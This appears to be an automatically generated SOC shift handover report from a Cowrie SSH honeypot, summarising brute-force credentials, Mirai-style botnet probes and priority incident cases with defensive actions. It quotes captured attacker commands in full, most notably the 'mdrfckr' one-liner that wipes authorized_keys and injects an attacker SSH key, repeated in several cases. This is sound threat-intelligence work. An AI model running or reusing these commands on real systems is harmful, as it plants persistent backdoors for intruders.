# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-19 |
| **Generated At** | 2026-11-19T19:47:03Z |
| **Shift Time** | 19:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **493** |
| Confirmed Threats | **423** |
| False Positives Filtered | **70** (14.2%) |
| Unique Attacker IPs | **198** |
| Countries of Origin | **43** |
| High Severity Cases | **304** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **189** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3339** |
| Unique Credential Pairs | **1568** |
| Unique Usernames | **551** |
| Unique Passwords | **1110** |
| Successful Auth Pairs | **3041** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1259 |
| `admin` | 138 |
| `ubuntu` | 96 |
| `user` | 55 |
| `support` | 53 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 162 |
| `123` | 83 |
| `root` | 77 |
| `admin` | 69 |
| `1234` | 67 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 53 |
| `admin` | `admin` | 45 |
| `root` | `root3245gs5662d34111111111` | 44 |
| `root` | `root` | 43 |
| `support` | `support` | 33 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ha-jun` | `ha-jun` | `45.148.10.61` | 2026-11-19T02:55:52 |
| `support` | `support` | `10.0.0.73` | 2026-11-19T02:59:55 |
| `si-u` | `si-u` | `45.148.10.61` | 2026-11-19T03:02:06 |
| `ubuntu` | `p@33word!@` | `93.152.221.108` | 2026-11-19T03:03:25 |
| `root` | `www163com` | `114.217.10.60` | 2026-11-19T03:04:11 |
| `rootssssss23424123123` | `rootssssss23424123123` | `114.217.10.60` | 2026-11-19T03:04:14 |
| `root` | `root3245gs5662d34111111111` | `114.217.10.60` | 2026-11-19T03:04:20 |
| `support` | `support` | `176.53.159.196` | 2026-11-19T03:07:05 |
| `root` | `adminpass` | `130.12.181.21` | 2026-11-19T03:07:28 |
| `do-hyeon` | `do-hyeon` | `45.148.10.61` | 2026-11-19T03:09:50 |
| `admin` | `adminserver` | `10.0.0.73` | 2026-11-19T03:10:55 |
| `support` | `support` | `49.131.195.158` | 2026-11-19T03:12:09 |
| `admin` | `admin` | `77.239.124.252` | 2026-11-19T03:17:38 |
| `tae-o` | `tae-o` | `45.148.10.61` | 2026-11-19T03:20:35 |
| `root` | `format@123` | `14.99.116.90` | 2026-11-19T03:28:34 |
| `rootssssss23424123123` | `rootssssss23424123123` | `14.99.116.90` | 2026-11-19T03:28:41 |
| `root` | `root3245gs5662d34111111111` | `14.99.116.90` | 2026-11-19T03:28:49 |
| `nginx` | `nginx` | `109.160.32.154` | 2026-11-19T03:32:24 |
| `ubuntu` | `1qaz2wsx` | `109.160.32.154` | 2026-11-19T03:32:30 |
| `root` | `dkflbckfd` | `109.160.32.154` | 2026-11-19T03:32:35 |
_… 3021 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **493** |
| Sessions with Fingerprint | **35** |
| Unique HASSH Fingerprints | **35** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 190 |
| libssh | 94 |
| OpenSSH | 12 |
| Unknown | 4 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 122 | 4 |
| `f555226df196...` | Mirai/variant | 61 | 29 |
| `7d01d047ace6...` | Mirai/variant | 23 | 4 |
| `a591c4ddccc9...` | Mirai/variant | 18 | 5 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 122 | 4 | Mirai/variant |
| `f555226df196...` | libssh | 61 | 29 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 23 | 4 | Mirai/variant |
| `a591c4ddccc9...` | libssh | 18 | 5 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 9 | 8 | — |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 5 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **133** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 58 | 31 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `169.128.70.53`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.227.144.174`, `160.191.244.41`, `85.95.166.40`, `123.58.219.129`, `103.189.208.13`, `67.52.95.38`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **198** |
| Unique ASNs | **94** |
| High-Risk ASNs | **70** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 56 | HIGH |
| `AS396982` | Google LLC | 7 | LOW |
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS6939` | Hurricane Electric LLC | 6 | HIGH |
| `AS15169` | Google LLC | 6 | HIGH |
| `AS213412` | ONYPHE SAS | 4 | LOW |
| `AS4766` | Korea Telecom | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (291)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ff58152fdfa3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]61` |
| **First Seen** | 2026-11-19 02:55 |
| **Last Seen** | 2026-11-19 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 02:55:52` | `cowrie.session.connect` |
| `2026-11-19 02:55:52` | `cowrie.client.version` |
| `2026-11-19 02:55:52` | `cowrie.client.kex` |
| `2026-11-19 02:55:52` | `cowrie.login.success` |
| `2026-11-19 02:55:53` | `cowrie.session.params` |
| `2026-11-19 02:55:53` | `cowrie.command.input` |
| `2026-11-19 02:55:53` | `cowrie.log.closed` |
| `2026-11-19 02:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e341dae6f322

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]108` |
| **First Seen** | 2026-11-19 03:03 |
| **Last Seen** | 2026-11-19 03:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:03:24` | `cowrie.session.connect` |
| `2026-11-19 03:03:24` | `cowrie.client.version` |
| `2026-11-19 03:03:24` | `cowrie.client.kex` |
| `2026-11-19 03:03:25` | `cowrie.login.success` |
| `2026-11-19 03:03:25` | `cowrie.direct-tcpip.request` |
| `2026-11-19 03:03:25` | `cowrie.direct-tcpip.data` |
| `2026-11-19 03:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]108` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a5b2a26a759

| Field | Detail |
|---|---|
| **Source IP** | `114.217.10[.]60` |
| **First Seen** | 2026-11-19 03:04 |
| **Last Seen** | 2026-11-19 03:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:04:10` | `cowrie.session.connect` |
| `2026-11-19 03:04:10` | `cowrie.client.version` |
| `2026-11-19 03:04:10` | `cowrie.client.kex` |
| `2026-11-19 03:04:11` | `cowrie.login.success` |
| `2026-11-19 03:04:12` | `cowrie.session.params` |
| `2026-11-19 03:04:12` | `cowrie.command.input` |
| `2026-11-19 03:04:12` | `cowrie.command.failed` |
| `2026-11-19 03:04:12` | `cowrie.log.closed` |
| `2026-11-19 03:04:13` | `cowrie.session.params` |
| `2026-11-19 03:04:13` | `cowrie.command.input` |
| `2026-11-19 03:04:13` | `cowrie.session.file_download` |
| `2026-11-19 03:04:13` | `cowrie.log.closed` |
| `2026-11-19 03:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.217.10[.]60` to AbuseIPDB if not already reported
- [ ] Block `114.217.10[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e41bb7dac110

| Field | Detail |
|---|---|
| **Source IP** | `114.217.10[.]60` |
| **First Seen** | 2026-11-19 03:04 |
| **Last Seen** | 2026-11-19 03:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:04:13` | `cowrie.session.connect` |
| `2026-11-19 03:04:13` | `cowrie.client.version` |
| `2026-11-19 03:04:14` | `cowrie.client.kex` |
| `2026-11-19 03:04:14` | `cowrie.login.success` |
| `2026-11-19 03:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.217.10[.]60` to AbuseIPDB if not already reported
- [ ] Block `114.217.10[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60636db94f76

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-19 03:07 |
| **Last Seen** | 2026-11-19 03:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:07:05` | `cowrie.session.connect` |
| `2026-11-19 03:07:05` | `cowrie.client.version` |
| `2026-11-19 03:07:05` | `cowrie.client.kex` |
| `2026-11-19 03:07:05` | `cowrie.login.success` |
| `2026-11-19 03:07:05` | `cowrie.direct-tcpip.request` |
| `2026-11-19 03:07:05` | `cowrie.direct-tcpip.data` |
| `2026-11-19 03:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1375e5efefba

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
| **First Seen** | 2026-11-19 03:07 |
| **Last Seen** | 2026-11-19 03:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:07:27` | `cowrie.session.connect` |
| `2026-11-19 03:07:27` | `cowrie.client.version` |
| `2026-11-19 03:07:27` | `cowrie.client.kex` |
| `2026-11-19 03:07:28` | `cowrie.login.success` |
| `2026-11-19 03:07:28` | `cowrie.direct-tcpip.request` |
| `2026-11-19 03:07:28` | `cowrie.direct-tcpip.data` |
| `2026-11-19 03:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed910a631e5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]252` |
| **First Seen** | 2026-11-19 03:17 |
| **Last Seen** | 2026-11-19 03:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:17:37` | `cowrie.session.connect` |
| `2026-11-19 03:17:38` | `cowrie.login.success` |
| `2026-11-19 03:17:38` | `cowrie.session.params` |
| `2026-11-19 03:17:38` | `cowrie.log.closed` |
| `2026-11-19 03:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fcbe5db4151

| Field | Detail |
|---|---|
| **Source IP** | `14.99.116[.]90` |
| **First Seen** | 2026-11-19 03:28 |
| **Last Seen** | 2026-11-19 03:28 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:28:31` | `cowrie.session.connect` |
| `2026-11-19 03:28:31` | `cowrie.client.version` |
| `2026-11-19 03:28:32` | `cowrie.client.kex` |
| `2026-11-19 03:28:34` | `cowrie.login.success` |
| `2026-11-19 03:28:35` | `cowrie.session.params` |
| `2026-11-19 03:28:35` | `cowrie.command.input` |
| `2026-11-19 03:28:35` | `cowrie.command.failed` |
| `2026-11-19 03:28:36` | `cowrie.log.closed` |
| `2026-11-19 03:28:37` | `cowrie.session.params` |
| `2026-11-19 03:28:37` | `cowrie.command.input` |
| `2026-11-19 03:28:38` | `cowrie.session.file_download` |
| `2026-11-19 03:28:38` | `cowrie.log.closed` |
| `2026-11-19 03:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.116[.]90` to AbuseIPDB if not already reported
- [ ] Block `14.99.116[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64228daf4e7b

| Field | Detail |
|---|---|
| **Source IP** | `14.99.116[.]90` |
| **First Seen** | 2026-11-19 03:28 |
| **Last Seen** | 2026-11-19 03:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:28:38` | `cowrie.session.connect` |
| `2026-11-19 03:28:38` | `cowrie.client.version` |
| `2026-11-19 03:28:39` | `cowrie.client.kex` |
| `2026-11-19 03:28:41` | `cowrie.login.success` |
| `2026-11-19 03:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.116[.]90` to AbuseIPDB if not already reported
- [ ] Block `14.99.116[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f888e8fbb33

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]154` |
| **First Seen** | 2026-11-19 03:32 |
| **Last Seen** | 2026-11-19 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:32:24` | `cowrie.session.connect` |
| `2026-11-19 03:32:24` | `cowrie.client.version` |
| `2026-11-19 03:32:24` | `cowrie.client.kex` |
| `2026-11-19 03:32:24` | `cowrie.login.success` |
| `2026-11-19 03:32:25` | `cowrie.session.params` |
| `2026-11-19 03:32:25` | `cowrie.command.input` |
| `2026-11-19 03:32:25` | `cowrie.log.closed` |
| `2026-11-19 03:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]154` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f788a89aa59a

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]51` |
| **First Seen** | 2026-11-19 03:45 |
| **Last Seen** | 2026-11-19 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:45:48` | `cowrie.session.connect` |
| `2026-11-19 03:45:48` | `cowrie.client.version` |
| `2026-11-19 03:45:48` | `cowrie.client.kex` |
| `2026-11-19 03:45:49` | `cowrie.login.success` |
| `2026-11-19 03:45:49` | `cowrie.direct-tcpip.request` |
| `2026-11-19 03:45:49` | `cowrie.direct-tcpip.data` |
| `2026-11-19 03:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]51` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c4e4c97a90

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-19 03:54 |
| **Last Seen** | 2026-11-19 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 03:54:10` | `cowrie.session.connect` |
| `2026-11-19 03:54:11` | `cowrie.login.success` |
| `2026-11-19 03:54:12` | `cowrie.session.params` |
| `2026-11-19 03:54:12` | `cowrie.log.closed` |
| `2026-11-19 03:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5218f0fdf6ab

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]154` |
| **First Seen** | 2026-11-19 04:00 |
| **Last Seen** | 2026-11-19 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:00:01` | `cowrie.session.connect` |
| `2026-11-19 04:00:01` | `cowrie.client.version` |
| `2026-11-19 04:00:02` | `cowrie.client.kex` |
| `2026-11-19 04:00:02` | `cowrie.login.success` |
| `2026-11-19 04:00:03` | `cowrie.session.params` |
| `2026-11-19 04:00:03` | `cowrie.command.input` |
| `2026-11-19 04:00:03` | `cowrie.log.closed` |
| `2026-11-19 04:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]154` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1268981d4d73

| Field | Detail |
|---|---|
| **Source IP** | `180.76.242[.]143` |
| **First Seen** | 2026-11-19 04:08 |
| **Last Seen** | 2026-11-19 04:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:08:04` | `cowrie.session.connect` |
| `2026-11-19 04:08:04` | `cowrie.client.version` |
| `2026-11-19 04:08:04` | `cowrie.client.kex` |
| `2026-11-19 04:08:06` | `cowrie.login.success` |
| `2026-11-19 04:08:09` | `cowrie.session.params` |
| `2026-11-19 04:08:09` | `cowrie.command.input` |
| `2026-11-19 04:08:09` | `cowrie.command.failed` |
| `2026-11-19 04:08:09` | `cowrie.log.closed` |
| `2026-11-19 04:08:10` | `cowrie.session.params` |
| `2026-11-19 04:08:10` | `cowrie.command.input` |
| `2026-11-19 04:08:10` | `cowrie.session.file_download` |
| `2026-11-19 04:08:10` | `cowrie.log.closed` |
| `2026-11-19 04:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.242[.]143` to AbuseIPDB if not already reported
- [ ] Block `180.76.242[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b242dd71e66c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.242[.]143` |
| **First Seen** | 2026-11-19 04:08 |
| **Last Seen** | 2026-11-19 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:08:11` | `cowrie.session.connect` |
| `2026-11-19 04:08:11` | `cowrie.client.version` |
| `2026-11-19 04:08:11` | `cowrie.client.kex` |
| `2026-11-19 04:08:12` | `cowrie.login.success` |
| `2026-11-19 04:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.242[.]143` to AbuseIPDB if not already reported
- [ ] Block `180.76.242[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f900a16c4d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]252` |
| **First Seen** | 2026-11-19 04:11 |
| **Last Seen** | 2026-11-19 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:11:23` | `cowrie.session.connect` |
| `2026-11-19 04:11:24` | `cowrie.login.success` |
| `2026-11-19 04:11:24` | `cowrie.session.params` |
| `2026-11-19 04:11:24` | `cowrie.log.closed` |
| `2026-11-19 04:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722ee712f023

| Field | Detail |
|---|---|
| **Source IP** | `103.189.208[.]13` |
| **First Seen** | 2026-11-19 04:13 |
| **Last Seen** | 2026-11-19 04:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
